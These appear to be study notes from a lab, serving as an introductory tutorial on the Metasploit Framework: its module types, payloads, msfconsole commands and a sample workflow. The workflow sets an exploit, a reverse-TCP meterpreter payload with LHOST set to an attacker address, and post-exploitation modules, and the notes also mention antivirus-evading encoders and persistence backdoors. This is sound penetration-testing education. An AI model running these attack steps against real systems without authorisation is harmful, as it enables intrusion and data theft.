Metasploit is a powerful and versatile penetration testing framework that allows you to exploit vulnerabilities in system, conduct reconnaissance, and perform post-exploitation tasks

Metasploit is an open-source penetration testing framework that helps security professionals find and exploit vulnerabilities in computer systems. It includes a database of known vulnerabilities and tools and scripts for exploiting them. It is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.
- **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).
- **Metasploit Framework**: The open-source version that works from the command line. 

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

---

### Understanding the Basics of Metasploit
Metasploit works with **modules** that help with various tasks like scanning, exploitation, and post-exploitation. Here are some essential commands you'll frequently use:

#### Core Commands :
- `search <keyword>`: Search for exploits, scanners, or auxiliary modules based on keywords (like "ftp," "smtp").
- `use <module_name>`: Load a specific module for usage.
- `info <module_name>`: Get detailed information about the selected module.
- `show options`: Show available configuration options for the loaded module.
- `set <option> <value>`: Set specific options, like the target IP address (`RHOST`).
- `run` or `exploit`: Execute the module you've configured.

---

The main components of the Metasploit Framework can be summarized as follows : 
- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
	- in metasploit, modules are reusable components that perform 
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. 
	- Some of these tools are 
		- msfvenom, 
		- pattern_create and 
		- pattern_offset
# Main Components of Metasploit
While using the metasploit framework, one will primarily interact with metasploit console. It can be launched from the terminal using the command `msfconsole`

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload.
- **Exploit:** A piece of code that uses a vulnerability present on the target system.
- **Vulnerability:** A design, coding, or logic flaw affecting the target system.
- **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. 
	- Payloads are the code that will run on the target system.

### Metasploit Modules Overview
There are four main types of modules in Metasploit:
1. **Exploits**
    - Exploits take advantage of vulnerabilities in systems or applications to gain access.
    - Example : 
    ```bash
    use exploit/windows/smb/ms08_067_netapi
	```
2. **Auxiliary modules**
	- These are use for tasks like scanning, fuzzing, and service enumeration
	- They do not exploit the system but gather useful data 
	- Example : 
	```bash
	use auxiliary/scanner/portscan/tcp
	```
3. **Payloads**
	- Payloads are code delivered to the target machine after exploiting a vulnerability
	- They can create a remote shell, open a backdoor, or gather information
	- e.g. 
	```bash
	set PAYLOAD windows/meterpreter/reverse_tcp
	```
4. **Encoder Modules** 
	- Encoders are used to modify payloads in a way that avoids detection by security software (like antivirus)
	- When payloads are being detected, encoders obfuscate the payload to evade detection
	- Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them 
	- e.g.
```bash
set ENCODER x86/shikata_ga_nai
```
5. **Nop (No-operation) modules**
	- Nop generators are used to generate No operation instructions to pad shellcode and ensure it executes correctly
	- To fine-tune exploit payloads and improve reliability, especially with buffer overflows
	- NOPs (No OPeration) do nothing, literally. They are often used as a buffer to achieve consistent payload sizes.
```bash
set NOP x86/single_byte
```
1. **Post-Exploitation Modules**
	- After compromising a system, post-exploitation modules allow you to gather further information, escalate privileges, or move laterally within the network
	- e.g. 
	```bash
	use post/windows/gather/enum_logged_on_users
	```
#### Auxiliary Modules
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit

20 directories, 2 files
```
#### Encoders
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86

10 directories, 0 files
```
#### Evasion
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb

1 directory, 9 files
```
#### Exploit
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
```

#### NOPs
NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
```
#### Payloads
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages

4 directories, 0 files
```
- **Adapters:** 
	- An adapter wraps single payloads to convert them into different formats. 
	- For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.  
- **Singles:** 
	- Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
- **Stagers:** 
	- Responsible for setting up a connection channel between Metasploit and the target system. 
	- Useful when working with staged payloads. 
		- “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). 
		- This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
- **Stages:** 
	- Downloaded by the stager. 
	- This will allow you to use larger sized payloads.

Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.
- generic/shell_reverse_tcp
- windows/x64/shell/reverse_tcp\
Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “`_`” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”

#### Post
- will be useful on the final stage of the penetration testing process, post-exploitation
```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows

12 directories, 0 files
```

### Payloads
In metasploit, a payload is the piece of code that runs on the target system after successfully exploiting a vulnerability. Payloads allow you to take specific actions o the target, like opening a remote shell or uploading files. 
#### Classification of Payloads
1. **Single Payload**
	- A single payload is a self-contained, standalone piece of code. 
		- Everything needed for the payload to execute is in a single package
	- E.g. If you use a simple reverse shell payload, it will contain all the instructions to open a connection back to your machine in one step
	- Advantages of Single payloads :
		- *Simplicity*
			- Everything is in one place, making it easier to deploy and quicker to execute
		- *No additional communication needed*
			- Since it's all in one go, there's no need for additional steps to establish a channel for further payload delivery
1. **Staged Payload**
	- A staged payload works in two parts : 
		1. **Stager**
			- The initial, smaller piece of code that sets up a communication channel between the attacker and the target machine
			- e.g. a reverse TCP stager will open a connection back to the attacker's machine
		1. **Stage**
			- Once the stager is successfully executed, it downloads or delivers the larger, more complex payload (the stage)
			- e.g. The `windows/meterpreter/reverse_tcp` payload delivers the initial stager to open the connection and then delivers the full Meterpreter shell once the connection is established.
	- Why use staged payloads ??
		- *Size Limitation bypass* 
			- They help bypass size restrictions by delivering the main functionality after initial execution 
		- *Flexibility* 
			- The attacker can adapt and decide what final payload (stage) to deliver after the initial stager is in place
		- *Modularity*
			- Stager can be used with various stages, so they can be mixed and matched for different situations 

#### Common Payload Types
1. **Meterpreter Payload**
	- Meterpreter is an advanced, interactive payload that provides a lot of post-exploitation capabilities
	- This includes file system access, process manipulation, privilege escalation, etc.
	- It's modular, meaning you can run various scripts and modules while connected to the target without sending a new payload each time
2. **Shell Payload**
	- A basic shell payload opens a single command-line interface (like 'bash' or 'cmd' shell) on the target system
	- Types of shell payloads 
		- *Bind Shell*
			- The target system listens for an incoming connection from the attacker
		- *Reverse Shell*
			- The target system initiates a connection back to the attacker's machine

#### Adapters
- These provide additional flexibility and customization when using payloads
- This is less common in typical user scenarios but involves modifying how payloads behave
- e.g by encrypting or encoding them to evade detection
- Adapter might help :
	- Create polymorphic payloads to bypass antivirus or intrusion detection 
	- Encapsulation payloads with custom obfuscation techniques


### Key Metasploit Components
1. **Exploit Database**
	- Metasploit houses a massive database of publicly know exploits
	- You can search through it for vulnerabilities in the target system
2. **Meterpreter**
	- Meterpreter is the default payload used in metasploit, offering a suite of post-exploitation tools to help gather information, escalate privileges, or maintain access 
3. **Nmap Integration**
	- nmap can be integrated with metasploit for advanced scanning and port mapping 
```bash
db_nmap -sV target_ip
```
---

# Common Workflow in Metasploit
1. **Scanning and Discovery**
	- use `Nmap` or `auxiliary modules` for scanning 
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS target_ip
run
```
2. **Searching for Exploits**
	- Based on the results, search for relevant exploits 
	- e.g. if a service like `SMB` is discovered
```bash
search smb
```
3. **Selecting an Exploit**
	- Choose an exploit form the search results
```bash
use exploit/windows/smb/ms08_067_netapi
```
4. **Setting Options**
	- Set the target IP and other necessary parameters 
```bash
set RHOSTS target_ip
set LHOST attacker_ip
set PAYLOAD windows/meterpreter/reverse_tcp
```
5. **Exploiting the target**
	- Once all the options are configured, execute the exploit 
```bash
exploit
```
6. **Post-Exploitation**
	- After successfully exploiting the target, you can use post-exploitation modules 
	- e.g.
```bash
use post/windows/gather/enum_logged_on_users
```
---
# Important Commands Recap
- Search for modules
```bash
search <keyword>
```
- view information about a module
```bash
info <module_name>
```
- set exploit/payload/option
```bash
set <option_name> <value>
```
- show options of loaded module
```bash
show options
```
- execute an exploit or auxiliary module 
```bash
run or exploit
```

---

# Additional Tips
- **Auto-exploitation**
	- one can use *Autopwn* or *Auxiliary Modules* like *db_autopwn* to automatically match against the discovered services
- **Persistent Session**
	- If you gain access to a machine and need to keep your access alive even after the session ends, use *Persistence Payloads* to create a backdoor
- **Session handling**
	- Once you have a session (like a metasploit shell), you can interact when it using : 
```bash
sessions -i <session_id>
```
- **Database Integration**
	- use Metasploit's built-in database to store results and information from scans  :
```bash
db_nmap <options>
```
---
# msfconsole
Once launched, the command line changes to msf6 (or msf5 depending on the installed version of metasploit). The metasploit console (*msfconsole*) can be used just like a regular command-line shell. It supports many features of the regular command-line

msfconsole is managed by context; this means that unless set as a global variable, all parameter settings will be lost if you change the module you have decided to use. For example consider that we have used the ms17_010_eternalblue exploit, and set parameters such as `RHOSTS`. If we were to switch to another module (e.g. a port scanner), we would need to set the RHOSTS value again as all changes we have made remained in the context of the ms17_010_eternalblue exploit.

Once you type the `use exploit/windows/smb/ms17_010_eternalblue` command, you will see the command line prompt change from msf6 to 
```msfconsole
msf6 exploit(windows/smb/ms17_010_eternalblue)
```
- `use`
	- The module to be used can also be selected with the `use` command followed by the number at the beginning of the search result line.
	- While the prompt has changed, you will notice we can still run the commands previously mentioned. This means we did not "enter" a folder as you would typically expect in an operating system command line. 
	- The prompt tells us we now have a context set in which we will work. You can see this by typing the `show options` command.
- `show options`
	- This will print options related to the exploit we have chosen earlier. 
	- The show options command will have different outputs depending on the context it is used in. 
		- In some examples it will shows that this exploit will require we set variables like RHOSTS and RPORT. On the other hand, a post-exploitation module may only need us to set a SESSION IDA session is an existing connection to the target system that the post-exploitation module will use.
- The `show` command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules. 
	- If used from the msfconsole prompt, the `show` command will list all modules. 
- The `use` and `show options` commands we have seen so far are identical for all modules in Metasploit. 
- You can leave the context using the `back` command. 
- Further information on any module can be obtained by typing the `info` command within its context. 
	- Alternatively, you can use the `info` command followed by the module’s path from the msfconsole prompt (e.g. `info exploit/windows/smb/ms17_010_eternalblue`). 
	- Info is not a help menu; it will display detailed information on the module such as its author, relevant sources, etc.
- `search`
	- This command will search the Metasploit Framework database for modules relevant to the given search parameter. 
	- You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.
	- The output of the `search` command provides an overview of each returned module. 
		- You may notice the “name” column already gives more information than just the module name. 
		- You can see the type of module (auxiliary, exploit, etc.) and the category of the module (scanner, admin, windows, Unix, etc.). 
	- You can use any module returned in a search result with the command use followed by the number at the beginning of the result line.
	- Another essential piece of information returned is in the “rank” column. 
		- Exploits are rated based on their reliability. 
		- The table below provides their respective descriptions.
	- You can direct the search function using keywords such as type and platform. 
		- For example, if we wanted our search results to only include auxiliary modules, we could set the type to auxiliary.
		- e.g. `msf6 > search type:auxiliary telnet`
Please remember that exploits take advantage of a vulnerability on the target system and may always show unexpected behavior. A low-ranking exploit may work perfectly, and an excellent ranked exploit may not, or worse, crash the target system.


| RANKING   | DESCIPTION                                                                                                                                                                                                                  |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Excellent | The exploit will never crash the service. This is the case for SQL injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances |
| Great     | The exploit has a default targt AND either auto-detects the appropriate target or uses an application specific return address AFTER a version check                                                                         |
| Good      | The exploit has a default target and it is the "common case" for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc.)                                                                        |
| Normal    | The exploit is otherwise reliable, but depends on a specific version and can't (or doesn't reliably) autodetect                                                                                                             |
| Average   | The exploit is generally unreliable or difficult to exploit                                                                                                                                                                 |
| Low       | The exploit is nearly impossible to exploit (or under 50% success rate) for common platforms                                                                                                                                |
| Manual    | The exploit is unstable or difficult to exploit and is basically a DoS. This ranking is also used when the module has no use specifically configured by the user                                                            |

#### Types of Command Prompts
When dealing with Metasploit, you may see five different prompts:
- **The regular command prompt:** You can not use Metasploit commands here.
```msfconsole
root@ip-10-10-XX-XX:~#
```        
- **The msfconsole prompt:** msf6 (or msf5 depending on your installed version) is the msfconsole prompt. As you can see, no context is set here, so context-specific commands to set parameters and run modules can not be used here.
```msfconsole
msf6 >
```
- **A context prompt:** Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.
```msfconsole
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
- **The Meterpreter prompt:** Meterpreter is an important payload. This means a Meterpreter agent was loaded to the target system and connected back to you. You can use Meterpreter specific commands here.
```msfconsole
meterpreter >
```
- **A shell on the target system:** Once the exploit is completed, you may have access to a command shell on the target system. This is a regular command line, and all commands typed here run on the target system.  
```msfconsole
C:\Windows\system32>

```
### Setting the Parameters
Once you have entered the context of a module using the `use`, you'll need to set parameters based on the module in use. 
- It is a good practice to use the `show optiions` command to list the required parameters 
- All parameters are set using the same command syntax : 
	```msfconsole
	set PARAMETER_NAME VALUE
    ```
Remember always to check the msfconsole prompt to ensure you are in the right context. 

Here are some of the often used parameters : 
- **RHOSTS**
	- Remote host
	- the IP address of the target system 
	- A single IP address or a network range can be set 
	- This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16 etc.) or a network range (10.10.10.x - 10.10.10.y)
	- You can also use a file where targets are listed, one target per line using `file:/path/of/the/target_file.txt` 
- **RPORT**
	- Remote port
	- the port on the target system the vulnerable application is running on
- **PAYLOAD**
	- The payload you will use with the exploit
- **LHOST**
	- Local Host
	- The attacking machine IP address
- **LPORT**
	- Local port
	- the port you will use for the reverse shell to connect back to 
	- This is a port on your attacking machine, and you can set it to any port not used by any other application 
- **SESSION**
	- Each connection established to the target system using metasploit will have a session ID
	- You will use this with post-exploitation modules that will connect to the target system using an existing connection
any of these parameters' values can be overridden with the `set` command. This value can also be cleared using the `unset` command or clear all set parameters with the `unset all` command 

`setg` command can be used to set values that will be used for all modules. This way when modules are changed the parameter value does not need to be set again with a `set` command. The `setg` values can be unset with the `unsetg` command 

### Using the Modules
Once all the parameters are set, the module can be launched using the `exploit` command. Metasploit also supports the `run` command which is an alias for the `exploit` command as the word exploit does not make sense when using non-exploit modules

The `exploit` command can be used without any parameters or using the `-z` parameter
- The `exploit -z` command will run the exploit and background the session as soon as it opens. This will return the context prompt form where the exploit was run
- Some modules support the `check` option. This will check if the target system is vulnerable without exploiting it

### Sessions
Once a vulnerability has been successfully exploited, a session will be created.
- This is the communication channel established between the target system and metasploit
- `background` command can be used to background the session prompt and go back to the msfconsole prompt
	- alternatively `ctrl + z` can be used to background sessions
- The `sessions` command can be used from the msfconsole prompt or any context to see the existing sessions 
- To interact with any session the `session -i` command can be used following the session number
```msfconsole
session -i 2
```